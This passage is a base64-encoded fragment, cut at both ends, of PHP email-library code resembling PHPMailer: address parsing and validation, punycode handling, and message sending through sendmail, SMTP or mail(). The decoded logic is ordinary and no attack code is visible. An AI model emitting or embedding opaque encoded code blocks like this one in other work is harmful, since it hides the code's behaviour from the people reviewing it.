CAgICAgICRsaXN0ID0gZXhwbG9kZSgnLCcsICRhZGRyc3RyKTsNCiAgICAgICAgICAgIGZvcmVhY2ggKCRsaXN0IGFzICRhZGRyZXNzKSB7DQogICAgICAgICAgICAgICAgJGFkZHJlc3MgPSB0cmltKCRhZGRyZXNzKTsNCiAgICAgICAgICAgICAgICBpZiAoc3RycG9zKCRhZGRyZXNzLCAnPCcpID09PSBmYWxzZSkgew0KICAgICAgICAgICAgICAgICAgICBpZiAoJHRoaXMtPnZhbGlkYXRlQWRkcmVzcygkYWRkcmVzcykpIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICRhZGRyZXNzZXNbXSA9IGFycmF5KA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICduYW1lJyA9PiAnJywNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAnYWRkcmVzcycgPT4gJGFkZHJlc3MNCiAgICAgICAgICAgICAgICAgICAgICAgICk7DQogICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgICAgICAgICBsaXN0KCRuYW1lLCAkZW1haWwpID0gZXhwbG9kZSgnPCcsICRhZGRyZXNzKTsNCiAgICAgICAgICAgICAgICAgICAgJGVtYWlsID0gdHJpbShzdHJfcmVwbGFjZSgnPicsICcnLCAkZW1haWwpKTsNCiAgICAgICAgICAgICAgICAgICAgaWYgKCR0aGlzLT52YWxpZGF0ZUFkZHJlc3MoJGVtYWlsKSkgew0KICAgICAgICAgICAgICAgICAgICAgICAgJGFkZHJlc3Nlc1tdID0gYXJyYXkoDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJ25hbWUnID0+IHRyaW0oc3RyX3JlcGxhY2UoYXJyYXkoDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICciJywNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIiciDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgKSwgJycsICRuYW1lKSksDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2FkZHJlc3MnID0+ICRlbWFpbA0KICAgICAgICAgICAgICAgICAgICAgICAgKTsNCiAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgICAgICByZXR1cm4gJGFkZHJlc3NlczsNCiAgICB9DQogICAgcHVibGljIGZ1bmN0aW9uIHNldEZyb20oJGFkZHJlc3MsICRuYW1lID0gJycsICRhdXRvID0gdHJ1ZSkgew0KICAgICAgICAkYWRkcmVzcyA9IHRyaW0oJGFkZHJlc3MpOw0KICAgICAgICAkbmFtZSAgICA9IHRyaW0ocHJlZ19yZXBsYWNlKCcvW1xyXG5dKy8nLCAnJywgJG5hbWUpKTsNCiAgICAgICAgaWYgKCgkcG9zID0gc3RycnBvcygkYWRkcmVzcywgJ0AnKSkgPT09IGZhbHNlIG9yICghJHRoaXMtPmhhczhiaXRDaGFycyhzdWJzdHIoJGFkZHJlc3MsICsrJHBvcykpIG9yICEkdGhpcy0+aWRuU3VwcG9ydGVkKCkpIGFuZCAhJHRoaXMtPnZhbGlkYXRlQWRkcmVzcygkYWRkcmVzcykpIHsNCiAgICAgICAgICAgICRlcnJvcl9tZXNzYWdlID0gJHRoaXMtPmxhbmcoJ2ludmFsaWRfYWRkcmVzcycpIC4gIiAoc2V0RnJvbSkgJGFkZHJlc3MiOw0KICAgICAgICAgICAgJHRoaXMtPnNldEVycm9yKCRlcnJvcl9tZXNzYWdlKTsNCiAgICAgICAgICAgICR0aGlzLT5lZGVidWcoJGVycm9yX21lc3NhZ2UpOw0KICAgICAgICAgICAgaWYgKCR0aGlzLT5leGNlcHRpb25zKSB7DQogICAgICAgICAgICAgICAgdGhyb3cgbmV3IHBocG1haWxlckV4Y2VwdGlvbigkZXJyb3JfbWVzc2FnZSk7DQogICAgICAgICAgICB9DQogICAgICAgICAgICByZXR1cm4gZmFsc2U7DQogICAgICAgIH0NCiAgICAgICAgJHRoaXMtPkZyb20gICAgID0gJGFkZHJlc3M7DQogICAgICAgICR0aGlzLT5Gcm9tTmFtZSA9ICRuYW1lOw0KICAgICAgICBpZiAoJGF1dG8pIHsNCiAgICAgICAgICAgIGlmIChlbXB0eSgkdGhpcy0+U2VuZGVyKSkgew0KICAgICAgICAgICAgICAgICR0aGlzLT5TZW5kZXIgPSAkYWRkcmVzczsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgICAgICByZXR1cm4gdHJ1ZTsNCiAgICB9DQogICAgcHVibGljIGZ1bmN0aW9uIGdldExhc3RNZXNzYWdlSUQoKSB7DQogICAgICAgIHJldHVybiAkdGhpcy0+bGFzdE1lc3NhZ2VJRDsNCiAgICB9DQogICAgcHVibGljIHN0YXRpYyBmdW5jdGlvbiB2YWxpZGF0ZUFkZHJlc3MoJGFkZHJlc3MsICRwYXR0ZXJuc2VsZWN0ID0gbnVsbCkgew0KICAgICAgICBpZiAoaXNfbnVsbCgkcGF0dGVybnNlbGVjdCkpIHsNCiAgICAgICAgICAgICRwYXR0ZXJuc2VsZWN0ID0gc2VsZjo6JHZhbGlkYXRvcjsNCiAgICAgICAgfQ0KICAgICAgICBpZiAoaXNfY2FsbGFibGUoJHBhdHRlcm5zZWxlY3QpKSB7DQogICAgICAgICAgICByZXR1cm4gY2FsbF91c2VyX2Z1bmMoJHBhdHRlcm5zZWxlY3QsICRhZGRyZXNzKTsNCiAgICAgICAgfQ0KICAgICAgICBpZiAoc3RycG9zKCRhZGRyZXNzLCAiXG4iKSAhPT0gZmFsc2Ugb3Igc3RycG9zKCRhZGRyZXNzLCAiXHIiKSAhPT0gZmFsc2UpIHsNCiAgICAgICAgICAgIHJldHVybiBmYWxzZTsNCiAgICAgICAgfQ0KICAgICAgICBpZiAoISRwYXR0ZXJuc2VsZWN0IG9yICRwYXR0ZXJuc2VsZWN0ID09ICdhdXRvJykgew0KICAgICAgICAgICAgaWYgKGRlZmluZWQoJ1BDUkVfVkVSU0lPTicpKSB7DQogICAgICAgICAgICAgICAgaWYgKHZlcnNpb25fY29tcGFyZShQQ1JFX1ZFUlNJT04sICc4LjAuMycpID49IDApIHsNCiAgICAgICAgICAgICAgICAgICAgJHBhdHRlcm5zZWxlY3QgPSAncGNyZTgnOw0KICAgICAgICAgICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICAgICAgICAgICRwYXR0ZXJuc2VsZWN0ID0gJ3BjcmUnOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0gZWxzZWlmIChmdW5jdGlvbl9leGlzdHMoJ2V4dGVuc2lvbl9sb2FkZWQnKSBhbmQgZXh0ZW5zaW9uX2xvYWRlZCgncGNyZScpKSB7DQogICAgICAgICAgICAgICAgJHBhdHRlcm5zZWxlY3QgPSAncGNyZSc7DQogICAgICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgICAgIGlmICh2ZXJzaW9uX2NvbXBhcmUoUEhQX1ZFUlNJT04sICc1LjIuMCcpID49IDApIHsNCiAgICAgICAgICAgICAgICAgICAgJHBhdHRlcm5zZWxlY3QgPSAncGhwJzsNCiAgICAgICAgICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgICAgICAgICAkcGF0dGVybnNlbGVjdCA9ICdub3JlZ2V4JzsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICAgICAgc3dpdGNoICgkcGF0dGVybnNlbGVjdCkgew0KICAgICAgICAgICAgY2FzZSAncGNyZTgnOg0KICAgICAgICAgICAgICAgIHJldHVybiAoYm9vbGVhbikgcHJlZ19tYXRjaCgnL14oPyEoPz4oPzEpIj8oPz5cXFxbIC1+XXxbXiJdKSI/KD8xKSl7MjU1LH0pKD8hKD8+KD8xKSI/KD8+XFxcWyAtfl18W14iXSkiPyg/MSkpezY1LH1AKScgLiAnKCg/Pig/Pig/PigoPz4oPz4oPz5ceDBEXHgwQSk/W1x0IF0pK3woPz5bXHQgXSpceDBEXHgwQSk/W1x0IF0rKT8pKFwoKD8+KD8yKScgLiAnKD8+W1x4MDEtXHgwOFx4MEJceDBDXHgwRS1cJyotXFtcXS1ceDdGXXxcXFxbXHgwMC1ceDdGXXwoPzMpKSkqKD8yKVwpKSkrKD8yKSl8KD8yKSk/KScgLiAnKFshIy1cJyorXC8tOT0/Xi1+LV0rfCIoPz4oPzIpKD8+W1x4MDEtXHgwOFx4MEJceDBDXHgwRS0hIy1cW1xdLVx4N0ZdfFxcXFtceDAwLVx4N0ZdKSkqJyAuICcoPzIpIikoPz4oPzEpXC4oPzEpKD80KSkqKD8xKUAoPyEoPzEpW2EtejAtOS1dezY0LH0pKD8xKSg/PihbYS16MC05XSg/PlthLXowLTktXSpbYS16MC05XSk/KScgLiAnKD8+KD8xKVwuKD8hKD8xKVthLXowLTktXXs2NCx9KSg/MSkoPzUpKXswLDEyNn18XFsoPzooPz5JUHY2Oig/PihbYS1mMC05XXsxLDR9KSg/PjooPzYpKXs3fScgLiAnfCg/ISg/Oi4qW2EtZjAtOV1bOlxdXSl7OCx9KSgoPzYpKD8+Oig/NikpezAsNn0pPzo6KD83KT8pKXwoPz4oPz5JUHY2Oig/Pig/NikoPz46KD82KSl7NX06JyAuICd8KD8hKD86LipbYS1mMC05XTopezYsfSkoPzgpPzo6KD8+KCg/NikoPz46KD82KSl7MCw0fSk6KT8pKT8oMjVbMC01XXwyWzAtNF1bMC05XXwxWzAtOV17Mn0nIC4gJ3xbMS05XT9bMC05XSkoPz5cLig/OSkpezN9KSlcXSkoPzEpJC9pc0QnLCAkYWRkcmVzcyk7DQogICAgICAgICAgICBjYXNlICdwY3JlJzoNCiAgICAgICAgICAgICAgICByZXR1cm4gKGJvb2xlYW4pIHByZWdfbWF0Y2goJy9eKD8hKD8+Ij8oPz5cXFxbIC1+XXxbXiJdKSI/KXsyNTUsfSkoPyEoPz4iPyg/PlxcXFsgLX5dfFteIl0pIj8pezY1LH1AKSg/PicgLiAnWyEjLVwnKitcLy05PT9eLX4tXSt8Iig/Pig/PltceDAxLVx4MDhceDBCXHgwQ1x4MEUtISMtXFtcXS1ceDdGXXxcXFxbXHgwMC1ceEZGXSkpKiIpJyAuICcoPz5cLig/PlshIy1cJyorXC8tOT0/Xi1+LV0rfCIoPz4oPz5bXHgwMS1ceDA4XHgwQlx4MENceDBFLSEjLVxbXF0tXHg3Rl18XFxcW1x4MDAtXHhGRl0pKSoiKSkqJyAuICdAKD8+KD8hW2EtejAtOS1dezY0LH0pKD8+W2EtejAtOV0oPz5bYS16MC05LV0qW2EtejAtOV0pPykoPz5cLig/IVthLXowLTktXXs2NCx9KScgLiAnKD8+W2EtejAtOV0oPz5bYS16MC05LV0qW2EtejAtOV0pPykpezAsMTI2fXxcWyg/Oig/PklQdjY6KD8+KD8+W2EtZjAtOV17MSw0fSkoPz46JyAuICdbYS1mMC05XXsxLDR9KXs3fXwoPyEoPzouKlthLWYwLTldWzpcXV0pezgsfSkoPz5bYS1mMC05XXsxLDR9KD8+OlthLWYwLTldezEsNH0pezAsNn0pPycgLiAnOjooPz5bYS1mMC05XXsxLDR9KD8+OlthLWYwLTldezEsNH0pezAsNn0pPykpfCg/Pig/PklQdjY6KD8+W2EtZjAtOV17MSw0fSg/PjonIC4gJ1thLWYwLTldezEsNH0pezV9OnwoPyEoPzouKlthLWYwLTldOil7Nix9KSg/PlthLWYwLTldezEsNH0oPz46W2EtZjAtOV17MSw0fSl7MCw0fSk/JyAuICc6Oig/Pig/OlthLWYwLTldezEsNH0oPz46W2EtZjAtOV17MSw0fSl7MCw0fSk6KT8pKT8oPz4yNVswLTVdfDJbMC00XVswLTldfDFbMC05XXsyfScgLiAnfFsxLTldP1swLTldKSg/PlwuKD8+MjVbMC01XXwyWzAtNF1bMC05XXwxWzAtOV17Mn18WzEtOV0/WzAtOV0pKXszfSkpXF0pJC9pc0QnLCAkYWRkcmVzcyk7DQogICAgICAgICAgICBjYXNlICdodG1sNSc6DQogICAgICAgICAgICAgICAgcmV0dXJuIChib29sZWFuKSBwcmVnX21hdGNoKCcvXlthLXpBLVowLTkuISMkJSZcJyorXC89P15fYHt8fX4tXStAW2EtekEtWjAtOV0oPzpbYS16QS1aMC05LV17MCw2MX0nIC4gJ1thLXpBLVowLTldKT8oPzpcLlthLXpBLVowLTldKD86W2EtekEtWjAtOS1dezAsNjF9W2EtekEtWjAtOV0pPykqJC9zRCcsICRhZGRyZXNzKTsNCiAgICAgICAgICAgIGNhc2UgJ25vcmVnZXgnOg0KICAgICAgICAgICAgICAgIHJldHVybiAoc3RybGVuKCRhZGRyZXNzKSA+PSAzIGFuZCBzdHJwb3MoJGFkZHJlc3MsICdAJykgPj0gMSBhbmQgc3RycG9zKCRhZGRyZXNzLCAnQCcpICE9IHN0cmxlbigkYWRkcmVzcykgLSAxKTsNCiAgICAgICAgICAgIGNhc2UgJ3BocCc6DQogICAgICAgICAgICBkZWZhdWx0Og0KICAgICAgICAgICAgICAgIHJldHVybiAoYm9vbGVhbikgZmlsdGVyX3ZhcigkYWRkcmVzcywgRklMVEVSX1ZBTElEQVRFX0VNQUlMKTsNCiAgICAgICAgfQ0KICAgIH0NCiAgICBwdWJsaWMgZnVuY3Rpb24gaWRuU3VwcG9ydGVkKCkgew0KICAgICAgICByZXR1cm4gZnVuY3Rpb25fZXhpc3RzKCdpZG5fdG9fYXNjaWknKSBhbmQgZnVuY3Rpb25fZXhpc3RzKCdtYl9jb252ZXJ0X2VuY29kaW5nJyk7DQogICAgfQ0KICAgIHB1YmxpYyBmdW5jdGlvbiBwdW55ZW5jb2RlQWRkcmVzcygkYWRkcmVzcykgew0KICAgICAgICBpZiAoJHRoaXMtPmlkblN1cHBvcnRlZCgpIGFuZCAhZW1wdHkoJHRoaXMtPkNoYXJTZXQpIGFuZCAoJHBvcyA9IHN0cnJwb3MoJGFkZHJlc3MsICdAJykpICE9PSBmYWxzZSkgew0KICAgICAgICAgICAgJGRvbWFpbiA9IHN1YnN0cigkYWRkcmVzcywgKyskcG9zKTsNCiAgICAgICAgICAgIGlmICgkdGhpcy0+aGFzOGJpdENoYXJzKCRkb21haW4pIGFuZCBAbWJfY2hlY2tfZW5jb2RpbmcoJGRvbWFpbiwgJHRoaXMtPkNoYXJTZXQpKSB7DQogICAgICAgICAgICAgICAgJGRvbWFpbiA9IG1iX2NvbnZlcnRfZW5jb2RpbmcoJGRvbWFpbiwgJ1VURi04JywgJHRoaXMtPkNoYXJTZXQpOw0KICAgICAgICAgICAgICAgIGlmICgoJHB1bnljb2RlID0gZGVmaW5lZCgnSU5UTF9JRE5BX1ZBUklBTlRfVVRTNDYnKSA/IGlkbl90b19hc2NpaSgkZG9tYWluLCAwLCBJTlRMX0lETkFfVkFSSUFOVF9VVFM0NikgOiBpZG5fdG9fYXNjaWkoJGRvbWFpbikpICE9PSBmYWxzZSkgew0KICAgICAgICAgICAgICAgICAgICByZXR1cm4gc3Vic3RyKCRhZGRyZXNzLCAwLCAkcG9zKSAuICRwdW55Y29kZTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICAgICAgcmV0dXJuICRhZGRyZXNzOw0KICAgIH0NCiAgICBwdWJsaWMgZnVuY3Rpb24gc2VuZCgpIHsNCiAgICAgICAgdHJ5IHsNCiAgICAgICAgICAgIGlmICghJHRoaXMtPnByZVNlbmQoKSkgew0KICAgICAgICAgICAgICAgIHJldHVybiBmYWxzZTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIHJldHVybiAkdGhpcy0+cG9zdFNlbmQoKTsNCiAgICAgICAgfQ0KICAgICAgICBjYXRjaCAocGhwbWFpbGVyRXhjZXB0aW9uICRleGMpIHsNCiAgICAgICAgICAgICR0aGlzLT5tYWlsSGVhZGVyID0gJyc7DQogICAgICAgICAgICAkdGhpcy0+c2V0RXJyb3IoJGV4Yy0+Z2V0TWVzc2FnZSgpKTsNCiAgICAgICAgICAgIGlmICgkdGhpcy0+ZXhjZXB0aW9ucykgew0KICAgICAgICAgICAgICAgIHRocm93ICRleGM7DQogICAgICAgICAgICB9DQogICAgICAgICAgICByZXR1cm4gZmFsc2U7DQogICAgICAgIH0NCiAgICB9DQogICAgcHVibGljIGZ1bmN0aW9uIHByZVNlbmQoKSB7DQogICAgICAgIHRyeSB7DQogICAgICAgICAgICAkdGhpcy0+ZXJyb3JfY291bnQgPSAwOw0KICAgICAgICAgICAgJHRoaXMtPm1haWxIZWFkZXIgID0gJyc7DQogICAgICAgICAgICBmb3JlYWNoIChhcnJheV9tZXJnZSgkdGhpcy0+UmVjaXBpZW50c1F1ZXVlLCAkdGhpcy0+UmVwbHlUb1F1ZXVlKSBhcyAkcGFyYW1zKSB7DQogICAgICAgICAgICAgICAgJHBhcmFtc1sxXSA9ICR0aGlzLT5wdW55ZW5jb2RlQWRkcmVzcygkcGFyYW1zWzFdKTsNCiAgICAgICAgICAgICAgICBjYWxsX3VzZXJfZnVuY19hcnJheShhcnJheSgNCiAgICAgICAgICAgICAgICAgICAgJHRoaXMsDQogICAgICAgICAgICAgICAgICAgICdhZGRBbkFkZHJlc3MnDQogICAgICAgICAgICAgICAgKSwgJHBhcmFtcyk7DQogICAgICAgICAgICB9DQogICAgICAgICAgICBpZiAoKGNvdW50KCR0aGlzLT50bykgKyBjb3VudCgkdGhpcy0+Y2MpICsgY291bnQoJHRoaXMtPmJjYykpIDwgMSkgew0KICAgICAgICAgICAgICAgIHRocm93IG5ldyBwaHBtYWlsZXJFeGNlcHRpb24oJHRoaXMtPmxhbmcoJ3Byb3ZpZGVfYWRkcmVzcycpLCBzZWxmOjpTVE9QX0NSSVRJQ0FMKTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIGZvcmVhY2ggKGFycmF5KA0KICAgICAgICAgICAgICAgICdGcm9tJywNCiAgICAgICAgICAgICAgICAnU2VuZGVyJywNCiAgICAgICAgICAgICAgICAnQ29uZmlybVJlYWRpbmdUbycNCiAgICAgICAgICAgICkgYXMgJGFkZHJlc3Nfa2luZCkgew0KICAgICAgICAgICAgICAgICR0aGlzLT4kYWRkcmVzc19raW5kID0gdHJpbSgkdGhpcy0+JGFkZHJlc3Nfa2luZCk7DQogICAgICAgICAgICAgICAgaWYgKGVtcHR5KCR0aGlzLT4kYWRkcmVzc19raW5kKSkgew0KICAgICAgICAgICAgICAgICAgICBjb250aW51ZTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgJHRoaXMtPiRhZGRyZXNzX2tpbmQgPSAkdGhpcy0+cHVueWVuY29kZUFkZHJlc3MoJHRoaXMtPiRhZGRyZXNzX2tpbmQpOw0KICAgICAgICAgICAgICAgIGlmICghJHRoaXMtPnZhbGlkYXRlQWRkcmVzcygkdGhpcy0+JGFkZHJlc3Nfa2luZCkpIHsNCiAgICAgICAgICAgICAgICAgICAgJGVycm9yX21lc3NhZ2UgPSAkdGhpcy0+bGFuZygnaW52YWxpZF9hZGRyZXNzJykgLiAnIChwdW55RW5jb2RlKSAnIC4gJHRoaXMtPiRhZGRyZXNzX2tpbmQ7DQogICAgICAgICAgICAgICAgICAgICR0aGlzLT5zZXRFcnJvcigkZXJyb3JfbWVzc2FnZSk7DQogICAgICAgICAgICAgICAgICAgICR0aGlzLT5lZGVidWcoJGVycm9yX21lc3NhZ2UpOw0KICAgICAgICAgICAgICAgICAgICBpZiAoJHRoaXMtPmV4Y2VwdGlvbnMpIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIHRocm93IG5ldyBwaHBtYWlsZXJFeGNlcHRpb24oJGVycm9yX21lc3NhZ2UpOw0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgIHJldHVybiBmYWxzZTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICB9DQogICAgICAgICAgICBpZiAoJHRoaXMtPmFsdGVybmF0aXZlRXhpc3RzKCkpIHsNCiAgICAgICAgICAgICAgICAkdGhpcy0+Q29udGVudFR5cGUgPSAnbXVsdGlwYXJ0L2FsdGVybmF0aXZlJzsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgICR0aGlzLT5zZXRNZXNzYWdlVHlwZSgpOw0KICAgICAgICAgICAgaWYgKCEkdGhpcy0+QWxsb3dFbXB0eSBhbmQgZW1wdHkoJHRoaXMtPkJvZHkpKSB7DQogICAgICAgICAgICAgICAgdGhyb3cgbmV3IHBocG1haWxlckV4Y2VwdGlvbigkdGhpcy0+bGFuZygnZW1wdHlfbWVzc2FnZScpLCBzZWxmOjpTVE9QX0NSSVRJQ0FMKTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgICR0aGlzLT5NSU1FSGVhZGVyID0gJyc7DQogICAgICAgICAgICAkdGhpcy0+TUlNRUJvZHkgICA9ICR0aGlzLT5jcmVhdGVCb2R5KCk7DQogICAgICAgICAgICAkdGVtcGhlYWRlcnMgICAgICA9ICR0aGlzLT5NSU1FSGVhZGVyOw0KICAgICAgICAgICAgJHRoaXMtPk1JTUVIZWFkZXIgPSAkdGhpcy0+Y3JlYXRlSGVhZGVyKCk7DQogICAgICAgICAgICAkdGhpcy0+TUlNRUhlYWRlciAuPSAkdGVtcGhlYWRlcnM7DQogICAgICAgICAgICBpZiAoJHRoaXMtPk1haWxlciA9PSAnbWFpbCcpIHsNCiAgICAgICAgICAgICAgICBpZiAoY291bnQoJHRoaXMtPnRvKSA+IDApIHsNCiAgICAgICAgICAgICAgICAgICAgJHRoaXMtPm1haWxIZWFkZXIgLj0gJHRoaXMtPmFkZHJBcHBlbmQoJ1RvJywgJHRoaXMtPnRvKTsNCiAgICAgICAgICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgICAgICAgICAkdGhpcy0+bWFpbEhlYWRlciAuPSAkdGhpcy0+aGVhZGVyTGluZSgnVG8nLCAndW5kaXNjbG9zZWQtcmVjaXBpZW50czo7Jyk7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICR0aGlzLT5tYWlsSGVhZGVyIC49ICR0aGlzLT5oZWFkZXJMaW5lKCdTdWJqZWN0JywgJHRoaXMtPmVuY29kZUhlYWRlcigkdGhpcy0+c2VjdXJlSGVhZGVyKHRyaW0oJHRoaXMtPlN1YmplY3QpKSkpOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgaWYgKCFlbXB0eSgkdGhpcy0+REtJTV9kb21haW4pICYmICFlbXB0eSgkdGhpcy0+REtJTV9zZWxlY3RvcikgJiYgKCFlbXB0eSgkdGhpcy0+REtJTV9wcml2YXRlX3N0cmluZykgfHwgKCFlbXB0eSgkdGhpcy0+REtJTV9wcml2YXRlKSAmJiBmaWxlX2V4aXN0cygkdGhpcy0+REtJTV9wcml2YXRlKSkpKSB7DQogICAgICAgICAgICAgICAgJGhlYWRlcl9ka2ltICAgICAgPSAkdGhpcy0+REtJTV9BZGQoJHRoaXMtPk1JTUVIZWFkZXIgLiAkdGhpcy0+bWFpbEhlYWRlciwgJHRoaXMtPmVuY29kZUhlYWRlcigkdGhpcy0+c2VjdXJlSGVhZGVyKCR0aGlzLT5TdWJqZWN0KSksICR0aGlzLT5NSU1FQm9keSk7DQogICAgICAgICAgICAgICAgJHRoaXMtPk1JTUVIZWFkZXIgPSBydHJpbSgkdGhpcy0+TUlNRUhlYWRlciwgIlxyXG4gIikgLiBzZWxmOjpDUkxGIC4gc3RyX3JlcGxhY2UoIlxyXG4iLCAiXG4iLCAkaGVhZGVyX2RraW0pIC4gc2VsZjo6Q1JMRjsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIHJldHVybiB0cnVlOw0KICAgICAgICB9DQogICAgICAgIGNhdGNoIChwaHBtYWlsZXJFeGNlcHRpb24gJGV4Yykgew0KICAgICAgICAgICAgJHRoaXMtPnNldEVycm9yKCRleGMtPmdldE1lc3NhZ2UoKSk7DQogICAgICAgICAgICBpZiAoJHRoaXMtPmV4Y2VwdGlvbnMpIHsNCiAgICAgICAgICAgICAgICB0aHJvdyAkZXhjOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgcmV0dXJuIGZhbHNlOw0KICAgICAgICB9DQogICAgfQ0KICAgIHB1YmxpYyBmdW5jdGlvbiBwb3N0U2VuZCgpIHsNCiAgICAgICAgdHJ5IHsNCiAgICAgICAgICAgIHN3aXRjaCAoJHRoaXMtPk1haWxlcikgew0KICAgICAgICAgICAgICAgIGNhc2UgJ3NlbmRtYWlsJzoNCiAgICAgICAgICAgICAgICBjYXNlICdxbWFpbCc6DQogICAgICAgICAgICAgICAgICAgIHJldHVybiAkdGhpcy0+c2VuZG1haWxTZW5kKCR0aGlzLT5NSU1FSGVhZGVyLCAkdGhpcy0+TUlNRUJvZHkpOw0KICAgICAgICAgICAgICAgIGNhc2UgJ3NtdHAnOg0KICAgICAgICAgICAgICAgICAgICByZXR1cm4gJHRoaXMtPnNtdHBTZW5kKCR0aGlzLT5NSU1FSGVhZGVyLCAkdGhpcy0+TUlNRUJvZHkpOw0KICAgICAgICAgICAgICAgIGNhc2UgJ21haWwnOg0KICAgICAgICAgICAgICAgICAgICByZXR1cm4gJHRoaXMtPm1haWxTZW5kKCR0aGlzLT5NSU1FSGVhZGVyLCAkdGhpcy0+TUlNRUJvZHkpOw0KICAgICAgICAgICAgICAgIGRlZmF1bHQ6DQogICAgICAgICAgICAgICAgICAgICRzZW5kTWV0aG9kID0gJHRoaXMtPk1haWxlciAuICdTZW5kJzsNCiAgICAgICAgICAgICAgICAgICAgaWYgKG1ldGhvZF9leGlzdHMoJHRoaXMsICRzZW5kTWV0aG9kKSkgew0KICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuICR0aGlzLT4kc2VuZE1ldGhvZCgkdGhpcy0+TUlNRUhlYWRlciwgJHRoaXMtPk1JTUVCb2R5KTsNCiAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICByZXR1cm4gJHRoaXMtPm1haWxTZW5kKCR0aGlzLT5NSU1FSGVhZGVyLCAkdGhpcy0+TUlNRUJvZHkpOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgICAgIGNhdGNoIChwaHBtYWlsZXJFeGNlcHRpb24gJGV4Yykgew0KICAgICAgICAgICAgJHRoaXMtPnNldEVycm9yKCRleGMtPmdldE1lc3NhZ2UoKSk7DQogICAgICAgICAgICAkdGhpcy0+ZWRlYnVnKCRleGMtPmdldE1lc3NhZ2UoKSk7DQogICAgICAgICAgICBpZiAoJHRoaXMtPmV4Y2VwdGlvbnMpIHsNCiAgICAgICAgICAgICAgICB0aHJvdyAkZXhjOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgICAgIHJldHVybiBmYWxzZTsNCiAgICB9DQogICAgcHJvdGVjdGVkIGZ1bmN0aW9uIHNlbmRtYWlsU2VuZCgkaGVhZGVyLCAkYm9keSkgew0KICAgICAgICBpZiAoIWVtcHR5KCR0aGlzLT5TZW5kZXIpIGFuZCBzZWxmOjppc1NoZWxsU2FmZSgkdGhpcy0+U2VuZGVyKSkgew0KICAgICAgICAgICAgaWYgKCR0aGlzLT5NYWlsZXIgPT0gJ3FtYWlsJykgew0KICAgICAgICAgICAgICAgICRzZW5kbWFpbEZtdCA9ICclcyAtZiVzJzsNCiAgICAgICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICAgICAgJHNlbmRtYWlsRm10ID0gJyVzIC1vaSAtZiVzIC10JzsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgIGlmICgkdGhpcy0+TWFpbGVyID09ICdxbWFpbCcpIHsNCiAgICAgICAgICAgICAgICAkc2VuZG1haWxGbXQgPSAnJXMnOw0KICAgICAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICAgICAkc2VuZG1haWxGbXQgPSAnJXMgLW9pIC10JzsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgICAgICAkc2VuZG1haWwgPSBzcHJpbnRmKCRzZW5kbWFpbEZtdCwgQGVzY2FwZXNoZWxsY21kKCR0aGlzLT5TZW5kbWFpbCksICR0aGlzLT5TZW5kZXIpOw0KICAgICAgICBpZiAoJHRoaXMtPlNpbmdsZVRvKSB7DQogICAgICAgICAgICBmb3JlYWNoICgkdGhpcy0+U2luZ2xlVG9BcnJheSBhcyAkdG9BZGRyKSB7DQogICAgICAgICAgICAgICAgaWYgKCFAJG1haWwgPSBwb3Blbigkc2VuZG1haWwsICd3JykpIHsNCiAgICAgICAgICAgICAgICAgICAgdGhyb3cgbmV3IHBocG1haWxlckV4Y2VwdGlvbigkdGhpcy0+bGFuZygnZXhlY3V0ZScpIC4gJHRoaXMtPlNlbmRtYWlsLCBzZWxmOjpTVE9QX0NSSVRJQ0FMKTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgZnB1dHMoJG1haWwsICdUbzogJyAuICR0b0FkZHIgLiAiXG4iKTsNCiAgICAgICAgICAgICAgICBmcHV0cygkbWFpbCwgJGhlYWRlcik7DQogICAgICAgICAgICAgICAgZnB1dHMoJG1haWwsICRib2R5KTsNCiAgICAgICAgICAgICAgICAkcmVzdWx0ID0gcGNsb3NlKCRtYWlsKTsNCiAgICAgICAgICAgICAgICAkdGhpcy0+ZG9DYWxsYmFjaygoJHJlc3VsdCA9PSAwKSwgYXJyYXkoDQogICAgICAgICAgICAgICAgICAgICR0b0FkZHINCiAgICAgICAgICAgICAgICApLCAkdGhpcy0+Y2MsICR0aGlzLT5iY2MsICR0aGlzLT5TdWJqZWN0LCAkYm9keSwgJHRoaXMtPkZyb20pO